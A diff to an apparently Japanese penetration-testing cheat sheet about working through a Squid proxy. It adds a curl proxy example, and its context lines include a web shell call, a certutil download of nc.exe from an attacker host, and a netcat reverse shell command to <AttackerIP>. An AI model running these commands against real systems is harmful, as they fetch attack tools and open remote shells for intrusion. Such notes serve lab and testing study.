@@ -87,6 +87,11 @@ python3 spose.py --proxy http://<squid_IP>:3128 --target <squid_IP>
 
 ## 各ツールのプロキシ対応オプション
 
+curl
+```sh
+curl -v --proxy http://<squid_IP>:3128 [-U <username>:<password>] http://<TargetIP>
+```
+
 Gobuster
 ```zsh
 gobuster dir -u http://<TargetIP|Domain>:<Port>/ -r -k -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 100 -o gobuster.txt -x '<extensions>' --proxy http://<squid_IP>:3128
@@ -140,7 +145,7 @@ http://<TargetIP>:8080/shell.php?cmd=whoami
 certutil -urlcache -f http://<AttackerIP>:8000/nc.exe nc.exe
 ```
 ```powershell
-nc.exe <attacker_IP> 443 -e cmd.exe
+nc.exe <AttackerIP> 443 -e cmd.exe
 ```
 
 ---
